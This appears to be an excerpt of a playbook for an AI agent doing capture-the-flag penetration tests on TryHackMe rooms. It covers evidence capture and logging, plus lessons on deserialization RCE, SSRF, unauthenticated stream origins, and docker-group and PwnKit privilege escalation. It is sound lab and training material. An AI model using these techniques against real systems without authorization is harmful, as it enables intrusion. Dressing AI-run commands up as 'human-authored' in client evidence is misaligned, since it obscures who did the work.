  listener), then `GOROOT=$(ls -d /usr/local/go /usr/lib/go-* | head -1) go tool objdump -s main.<fn>`
  (or GNU `objdump -d`): a `runtime.memequal`/`strcmp` on the auth check means the code/token is a
  PLAINTEXT string in `.rodata` (read it from the `LEAQ` target VA via the readelf LOAD offset), and an
  `os/exec.Command` sink means your input runs as a shell command AS WHATEVER USER the service runs -
  check `systemctl cat <svc>` for `User=`. Extract the code, hit the sink -> RCE as that user (often root).

## Capture (engagement discipline)

After each phase, write to `targets/<eng>/`: hosts/access -> `state.md`, creds -> `loot.md`, chain -> `paths.md`, vulns -> `Vuln-index.md`, dead-ends -> `Deadends.md`, narrative -> `log.md`. Flags go in the writeup, never in `session/*` or `wiki/`.

**Board hygiene is the anti-loop record, not busywork - keep `paths.md`/`Deadends.md` LIVE (recurring rot).** The killchain board mostly duplicates `state.md`, so under momentum it rots and, worse, the ONE part that is NOT redundant - the per-vector dead-end log - gets skipped. The failure mode: `state.md` accumulates "tried X, tried Y, tried Z, all blocked" as prose while `paths.md` and `Deadends.md` sit as empty templates, so a later session (or the analyzer) cannot tell which vectors are exhausted and re-suggests them. **The instant a vector (esp. a privesc primitive - each potato variant, each kernel CVE, each cred spray) is exhausted, append ONE `Deadends.md` line + set its `paths.md` status BEFORE trying the next** - this is GATE 3, done live, not at close-out. If a Stop hook nudges "loot captured but paths.md empty," that is the reflex firing - act on it, do not ride past it. `status.py` shows the board phase + deadend count so you can see the board vs `state.md` drift.

**Live-capture machinery (so evidence is NOT all backfilled at close-out - the recurring miss):**
- **Auto-card of scan tabs is a backstop, still NOT a substitute for judgement.** The Stop hook runs
  `scripts/autocard.sh` SYNCHRONOUSLY-but-BOUNDED each turn (caps to `AUTOCARD_MAX=2` tabs/run +
  per-SSH `timeout`, so it finishes in a few seconds inside the hook window) to render any FINISHED
  scan tmux tab into `recon/` (idempotent via `.carded-tabs`; cards named `auto-<tab>`). This replaced
  the old DETACHED spawn, which was unreliable over the WSL/remote-VM SSH bridge - the grandchild
  often never ran, so cards only appeared in one late batch at close-out. In-hook + capped makes them
  trickle in live and deterministically. It is still only a backstop for SCAN tabs: **hand-card as you
  go remains PRIMARY** for the deliberate exploit shots (Phase 1: `capture.sh recon <eng> <slug> <tab>`
  per tab as it finishes), and **before leaving recon, VERIFY** `ls targets/<eng>/recon/` is non-empty
  (or `status.py`'s recon-card count > 0). 0 cards while scan tabs have finished = something's wrong
  (VM down / `timeout` missing); hand-card them now.
- **You still hand-card the deliberate EXPLOIT-state shots** as they land - the flag in place, the RCE
  firing, a shell, an authed panel - since only judgement knows which moment matters, and persist
  findings to `state.md`/`loot.md`/`paths.md` the moment they land (do not defer to close-out).
- **A PoC card shows ONE human-authored command, not a merged AI pipeline.** Evidence cards (and every
  command that lands in walkthrough.md) go in front of a client/technical team later, so the captured
  command must read as something a person would type: a SINGLE command with concrete values and FULL
  paths - NO `export VAR=` / `$VAR`, NO `;`/`&&`-chained multi-step one-liners, NO `echo "-- label --"`
  banners, NO base64/pty wrappers. When you needed a merged diagnostic pipeline to WORK the box (fine
  for log.md), RE-RUN the clean single command for the capture. If a step needs an env var (e.g.
  `KRB5CCNAME`), inline it on the one command (`KRB5CCNAME=/tmp/x.ccache impacket-smbclient ...`),
  never a separate `export` line. The messy automation stays in `log.md`; the card and the walkthrough
  are the human version.

**Log each step to `log.md` AS it lands (step 1 -> step 2 -> ...), not at close-out.** The operator follows the box LIVE from `log.md`, so append a line the moment a step works. `log.md` holds the REAL commands - including the messy automation (base64-wrapped scripts, pty `su` helpers, joint one-liners) - so it is reproducible and the operator sees exactly what ran. **`walkthrough.md` is the CLEAN human version:** concrete one-liners a person would type (real IP/host, NO `$VAR`s, NO base64/pty wrappers). If a step needed a script, show the simple human action in the walkthrough (e.g. `su cobra` then type the password) and keep the automation in `log.md` / `poc/scripts/`.

**Read the UI/source hints LITERALLY before fuzzing.** An input `placeholder`, a button label, a referenced `.js`, or leaked source usually tells you the intended input format. (Dodge: the field placeholder said "sudo command parameter" - it wanted `sudo ufw allow <port>`, an allowlist, not injection. Hours were lost fuzzing it as command-injection.)

**Beware locally-substituted payloads = FALSE-POSITIVE RCE (high-severity trap).** A payload containing `$(...)`, backticks, or `$VAR` sent through the VM bridge (or any local shell / a `for p in $(...)` loop) is substituted LOCALLY before it reaches the target - and the tooling VM runs as ROOT, so a reflected `uid=0(root)` may be YOUR OWN box, not the target. ALWAYS single-quote or base64 injection payloads; confirm the target actually executed it with a marker only the target can produce (its hostname, a file only it has). NEVER claim RCE from a reflected `id`/`uid` that matches your attacker host - re-send the exact payload single-quoted and re-check before believing it.

**Preserve exploit scripts and read source.** When you write the exploit script Rule 0 has you fall back to (a payload HTML, an escape/forge script, a webshell) or read a target's source, copy it into `targets/<eng>/poc/scripts/` and card the source with its URL (e.g. `shot.py --term --url-bar`); the reviewer needs the code and the state together, not just a screenshot. **Save it as `<name>.md` with the code in a ```` ```sh ````/```` ```js ````/```` ```py ```` fence, NOT a bare `.sh`/`.js`/`.py`** - Obsidian only previews `.md`/images in the GUI, so a raw-extension script is invisible to the operator. (`capture.sh log` already writes `.md`; saved page source is `-source.md` with an ```` ```html ```` fence for the same reason. For a targeted EXCERPT of source that revealed something, `capture.sh snippet <eng> <slug> <url-or-file> '<grep-pattern>' '<reveals>'` writes a fenced `poc/NN-<slug>-snippet.md` to paste into walkthrough Recon.)

**Target VIDEO/media -> mp4 into `poc/`, and hand it to the operator EARLY.** If a target yields a
clip (CCTV/camera feed, HLS stream, screen recording), pull the segments and remux to mp4 straight
into `targets/<eng>/poc/` (`ffmpeg -i <in> -c copy poc/<slug>.mp4`), then tell the operator where it
is - a visual puzzle (a shoulder-surf, a code on screen) is far cheaper read by the human than
brute-analyzed frame-by-frame. Frame extraction/OCR is the FALLBACK, not the opening move. (HopSec
Asylum lesson: ~40% of a ~1.8M-token run went to montaging keypad frames the operator read in seconds.)

**Screenshot EVERY successful step as you go (not at the end).** The walkthrough must be report-ready
from the `.md` alone. The moment a step LANDS - valid cred / Pwn3d, a BloodHound edge, a GUI foothold
(RDP desktop, unlocked KeePass, admin panel), a bad permission found, the DA hash, the flag - capture it
LIVE and drop the `![]()` ref inline at that step + in the `## Evidence` gallery. There is NO auto-capture
net anymore: evidence is captured LIVE via `scripts/capture.sh` (ev/req/tmux/burp) straight into `poc/`
the MOMENT a step lands, never at the end. **One-call live path (`capture.sh ev`):** tee the step's output
on the VM, then `scripts/capture.sh ev <eng> <slug> "<request-url>" "<cmd-label>"` - it cards the output
showing BOTH the command and the request URL and pulls the PNG into `poc/` in a single call, so live
capture has no friction (`cmd`+`url` are required, so no card is anonymous). **For a lead from a web
request** (a curl returning creds / a flag / leaked source), the real curl **request+response** is the
artifact - `scripts/capture.sh req <eng> <slug> -- <curl-args>` captures a full-fidelity `curl -iv`
request/response card (crypto-forged? give the exploit a `--curl` mode that emits the concrete curl). For
evidence that should look like a real tmux session run `scripts/capture.sh tmux <eng> <slug> <script.sh>`;
a Burp Repeater req/resp PoC is `scripts/capture.sh burp ...`. `Skill(screenshot)` covers authed/exploited
states (dashboard, vuln firing, the flag) and the narrative `--tmux` session cards. Under the hood:
CLI/tool output -> `shot.py --term` (colored terminal card) or `--tmux` (live tab); GUI/desktop ->
`--window`/`--screen` (or `import -window root` off a headless xfreerdp). Backfilling at the end loses
transient state (sessions, dialogs, one-shot output) - capture at the moment of success. **NEVER hand-write
a tool's output into a `--term` card - that is fabricated evidence.** Capture the REAL stream: if a command
is launched with output redirected (`> log`), the tmux pane stays EMPTY, so `tee` the output into the pane
OR `shot.py --term <the-real-logfile>`. GUI foothold that can't reproduce (RDP session, unlocked KeePass) -
screenshot it live; a box that expires cannot be recaptured. Curate your `poc/` step shots into the
`## Evidence` gallery, or run `python3 scripts/build-walkthrough.py <eng>` to auto-populate that gallery
from every rendered card in `poc/` (it refreshes the Evidence table in place and never touches your narrative).

**Grow the harness wordlist.** If a non-obvious route/file/param cracked the box (one the standard
lists missed, e.g. `/internal`), feed the GENERIC token back so the next box is faster:
`python3 scripts/wordlist-suggest.py` (leak-safe, read-only) then `scripts/wl-add.sh paths <token>`
/ `wl-add.sh params <name>`. Add only generic methodology names - never client-specific branding.

## Lesson: multi-service web escape chain - media-origin BFLA, allowlist-SSRF, SUID->docker (THM HopSec Asylum)
Load `Skill(hunt-idor)`/`Skill(hunt-ssrf)`/`Skill(hunt-api)`. Owned via app-logic bugs, not a memory CVE.
- **Client-side-only auth = BAC:** a "flag" endpoint gated only by a JS `session_check` returns the flag when hit raw. Always call the CGI/API endpoint directly, never trust the UI gate.
- **OSINT combinator password:** a fake-social app leaked an old password shape + the owner's dog name + birth year -> new password was a combinator of those in the same shape. Build the small custom list from OSINT, don't grind rockyou.
- **Media-origin path BFLA:** the video API gated an admin camera but the HLS origin (nginx) served `/hls/<cam>/playlist.m3u8` with NO auth. When an API restricts a stream, test the segment/origin server directly.
- **Allowlist-SSRF that mints a console token:** a hidden `/v1/ingest/diagnostics` (in an `#EXT-X-SESSION-DATA` manifest header - read the FULL manifest) validated `rtsp_url` against an allowlist whose magic host minted a shell token. Treat any "diagnostics/ingest/probe" endpoint taking a URL as an SSRF/trigger surface. See [[wiki/payloads/ssrf]].
- **SUID-that-only-setuid + `sg`/`newgrp`:** a custom SUID doing `setuid(other);execl(bash)` gives you that UID but KEEPS your groups; if that user is in `docker`, `sg docker -c '<cmd>'` -> docker socket -> root (`docker run -v /:/host`). See [[linux-privesc]].

## Lesson: a "static template" is often a dynamic app - READ the JS end-to-end, don't grep (THM Buzz)
- **`/static/` paths + `onclick=` handlers = a Flask app in disguise.** "Game Ratings" buttons had `onclick="sendRequest('1')"`; `dropdown.js` (unopened - I read custom.js and moved on) defined it as `POST /fetch {"object":"/var/upload/games/object.pkl"}` -> Flask -> pickle.
- **A file-PATH-taking loader + a separate arbitrary-upload = deser RCE:** `/fetch` does `pickle.load(open(<client-path>))`; the `/secret/upload/` form stores files OUTSIDE the webroot (a DELIVERY mechanism, not a webshell). Upload a `__reduce__` pickle, POST `/fetch` at its path -> RCE. See [[insecure-deserialization]].
- **A grep of a page/JS is NOT a read:** greps filtered out the exact `sendRequest`/`/fetch` lines. When an upload's files vanish or a site "has no dynamic surface", open the JS handler/response and read top-to-bottom.
- **Egress was port-filtered:** `/dev/tcp` + shells to high ports (9001) died while curl and a python reverse shell to 443 worked. Confirm egress with a curl-callback over candidate ports, use an http-ish port. Root was PwnKit once the intended knockd->SSH path was dead. See [[privesc-exploit-arsenal]].

## Lesson: flag accounting - sweep ALL flags after root; the first one is not "the user flag" (THM Battery)
- **The instant you have root, enumerate EVERY flag before declaring done:** `grep -RIn 'THM{' / --exclude-dir={proc,sys,dev,run,mnt} 2>/dev/null` (swap the platform's format: `flag{`, `HTB{`, `picoCTF{`). One command, authoritative. I grabbed root + the FIRST home-dir flag and reported it as "user flag" - it was a DECOY, and the real user flag was in a SECOND user's home. The end-of-box full-FS grep found all of them in seconds; run it at the START of close-out, not after the operator says a flag is wrong.
- **A flag file with a troll marker is a decoy:** `flag1.txt` ended with "Sorry I am not good in designing ascii art :(" - the room's tell that it is not a scored flag. Multiple shell users (`cyber` AND `yash`) means the scored "user flag" may belong to a LATER user reached by lateral movement, not the first foothold.
- **A root shortcut can skip the intended user flag.** I jumped `cyber -> root` via a `sudo NOPASSWD` script and never did the intended `cyber -> yash` lateral (a root-owned `emergency.py` + a `fernet` token in yash's home) - which is exactly where the scored user flag lived. Getting root fast is fine, but then sweep for the flags/steps the shortcut bypassed.
- **Map flags to the room's task structure + answer format UP FRONT, and know the platform mechanic:** count how many flags the room scores and their format (`THM{` + 32 hex here). Revamped THM rooms plant an intro/"Base Flag" as an HTML comment in the ROOM PAGE source on tryhackme.com (view-source / Ctrl+U), NOT on the target - a full-FS grep on the box will never find it. If a scored flag is nowhere on disk, it is an off-box/portal artifact, not a missed file.
- **Verify file state with `wc -c`/`md5sum`, not a single `ls`.** A lone `ls` showed a transient wrong size (mid box-reset); byte count + md5 + the served response agreeing is the real "did we read the whole file". A THM/HTB box redeploys/resets under you - re-verify rather than trusting one stat.

## Context tools

<!-- auto-wired: documented tools to reach for; do not hand-roll -->
- [[nmap]]
- [[rustscan]]
- [[naabu]]
- [[ffuf]]
- [[feroxbuster]]
- [[gobuster]]
- [[nuclei]]
- [[nikto]]
- [[whatweb]]
- [[arjun]]
- [[dalfox]]
- [[swaks]]
- [[wiki/cheatsheets/recon]]
- [[nuclei-arsenal]]
- [[wordlists]]
- [[network-services]]
- [[linux-enumeration]]
- [[windows-enumeration]]
- [[windows-privesc]]
- [[password-attacks]]
- [[sqlmap]]
- [[pivoting]]
- [[web-client-attacks]]
- [[metasploit]]
